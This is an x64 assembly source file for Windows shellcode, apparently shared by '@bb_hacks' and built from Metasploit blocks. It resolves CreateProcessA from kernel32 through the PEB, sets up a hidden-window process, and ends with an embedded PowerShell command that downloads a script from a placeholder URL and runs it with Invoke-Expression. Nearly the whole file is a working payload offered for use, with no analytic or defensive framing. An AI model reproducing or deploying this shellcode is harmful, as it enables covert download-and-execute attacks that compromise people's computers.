; BASEx64 PI SCODE using CreateProcessA - hidden window by @bb_hacks
; Based on https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/block/block_shell.asm and https://emsea.github.io/2017/12/04/import-by-hash/ and many other bits stolen from everywhere
; very hacky
BITS 64

global main
section .text


main:



;================================
;Find Kernel32 Base
;================================

    ; Obtain base of kernel32.dll in rbx
	cdq
	mov rax,[gs:rdx+0x60] ;PEB
	mov rax,[rax+0x18] ;PEB.Ldr
	mov rsi,[rax+0x10] ;PEB.Ldr->InMemOrderModuleList
	lodsq
	mov rsi,[rax]
	mov rbx,[rsi+0x30] ;kernel32.dll base address


  find_export_dir:
    ;.e_lfanew   = 3Ch
    ;.data_dir_0 = 88h

    ; Obtain IMAGE_EXPORT_DIRECTORY address in rax
    mov eax, [rbx + 0x3C]
    mov eax, [rbx + rax + 0x88]
    add rax, rbx


  read_export_dir:
    ;.export_names_num  = 18h
    ;.export_funcs_addr = 1Ch
    ;.export_names_addr = 20h
    ;.export_ords_addr  = 24h

    ; Obtain info from IMAGE_EXPORT_DIRECTORY
    mov r13d, [rax + 0x1c] ; AddressOfFunctions
    mov r14d, [rax + 0x20] ; AddressOfNames
    mov r15d, [rax + 0x24]  ; AddressOfNameOrdinals
    mov r12d, [rax + 0x18]  ; NumberOfNames
    add r13, rbx
    add r14, rbx
    add r15, rbx


    xor ecx, ecx
  find_exports:
    mov esi, [r14 + rcx*4] ; use rcx to index AddressOfNames getting cur func name RVA
    add rsi, rbx
	inc ecx
	cmp dword [rsi],   0x61657243 ;Crea
	jne find_exports
	cmp dword [rsi+8], 0x7365636f ;oces
	;cmp dword [esi+10], 0x57737365 ;essW
	jne find_exports
	dec ecx
    xor eax, eax           ; not needed if eax is already 0
    mov ax, [r15 + rcx*2]  ; get export's index into AddressOfFunctions
    mov eax, [r13 + rax*4] ; get export address rva from AddressOfFunctions
    add rax, rbx
	mov rbp, rax


;================================
;Zero Memory
;================================
  xor r8, r8                  ; Clear r8 for all the NULL's we need to push
  push byte 13                ; We want to place 104 (13 * 8) null bytes onto the stack
  pop rcx                     ; Set RCX for the loop
push_loop:                    ;
  push r8                     ; push a null qword
  loop push_loop              ; keep looping untill we have pushed enough nulls


;================================
;Call CreateProcessA
;================================

mov rcx,rsp
call dbCommandline		;call empty subroutine
sub esp,8				;move stack
mov edx, [esp]			;pass return address from stack to edx
add esp,8				;rebase stack
add edx,0x39			;add offset to dbCommandline


;00007FF710C417C6 | 48:8D0D F3840000         | lea rcx,qword ptr ds:[7FF710C49CC0]                             | CreateProcessExample.cpp:16, 00007FF710C49CC0:L"notepad.exe"
;00007FF710C417CD | FF15 4DEB0000            | call qword ptr ds:[<&_wcsdup>]                                  |
;00007FF710C417D3 | 48:8985 C8000000         | mov qword ptr ss:[rbp+C8],rax                                   | [rbp+C8]:L"notepad.exe"
;00007FF710C417DA | 48:8D85 98000000         | lea rax,qword ptr ss:[rbp+98]                                   | CreateProcessExample.cpp:17
;00007FF710C417E1 | 48:894424 48             | mov qword ptr ss:[rsp+48],rax                                   |
;00007FF710C417E6 | 48:8D45 10               | lea rax,qword ptr ss:[rbp+10]                                   |
;00007FF710C417EA | 48:894424 40             | mov qword ptr ss:[rsp+40],rax                                   |
;00007FF710C417EF | 48:C74424 38 00000000    | mov qword ptr ss:[rsp+38],0                                     |
;00007FF710C417F8 | 48:C74424 30 00000000    | mov qword ptr ss:[rsp+30],0                                     |
;00007FF710C41801 | C74424 28 00000000       | mov dword ptr ss:[rsp+28],0                                     |
;00007FF710C41809 | C74424 20 00000000       | mov dword ptr ss:[rsp+20],0                                     |
;00007FF710C41811 | 45:33C9                  | xor r9d,r9d                                                     |
;00007FF710C41814 | 45:33C0                  | xor r8d,r8d                                                     |
;00007FF710C41817 | 48:8B95 C8000000         | mov rdx,qword ptr ss:[rbp+C8]                                   | [rbp+C8]:L"notepad.exe"
;00007FF710C4181E | 33C9                     | xor ecx,ecx                                                     |
;00007FF710C41820 | FF15 B2E80000            | call qword ptr ds:[<&CreateProcessW>]                           |


;BOOL CreateProcessA(
;RCX  LPCSTR                lpApplicationName,			NULL (R8)
;RDX  LPSTR                 lpCommandLine,				EDX
;R8  LPSECURITY_ATTRIBUTES lpProcessAttributes,			NULL (R8)
;R9  LPSECURITY_ATTRIBUTES lpThreadAttributes,			NULL (R8)
;stack  BOOL                  bInheritHandles,			NULL (R8)
;stack  DWORD                 dwCreationFlags,			NULL (R8)
;stack  LPVOID                lpEnvironment,			NULL (R8)
;stack  LPCSTR                lpCurrentDirectory,		NULL (R8)
;stack  LPSTARTUPINFOA        lpStartupInfo,			RAX
;stack  LPPROCESS_INFORMATION lpProcessInformation		RSI
;);

mov word [rsp+84], 0x0101   ; Set the STARTUPINFO Structure's dwFlags to STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
lea rax, [rsp+24]           ; Set RAX as a pointer to our STARTUPINFO Structure
mov byte [rax], 104         ; Set the size of the STARTUPINFO Structure
mov rsi, rsp                ; Save the pointer to the PROCESS_INFORMATION Structure


push rsi                    ; Push the pointer to the PROCESS_INFORMATION Structure
push rax                    ; Push the pointer to the STARTUPINFO Structure
push r8                     ; The lpCurrentDirectory is NULL so the new process will have the same current directory as its parent
push r8                     ; The lpEnvironment is NULL so the new process will have the same enviroment as its parent
push r8                     ; We dont specify any dwCreationFlags
push r8                     ; Set bInheritHandles to FALSE in order to inheritable all possible handle from the parent
mov r9, r8                  ; Set fourth param, lpThreadAttributes to NULL
                              ; r8 = lpProcessAttributes (NULL)
                              ; rdx = the lpCommandLine to point to "cmd",0
mov rcx, r8                 ; Set lpApplicationName to NULL as we are using the command line param instead
push r9
push r9
push r9
push rdx

;call CreateProcessA
call RBP				; call CREATE_PROCESSA

dbCommandline:
ret

db "powershell ", "$OCTCHAR = (New-Object Net.WebClient).DownloadString('OCT_URL');Invoke-Expression $OCTCHAR;",0

;db "paint.exe",0
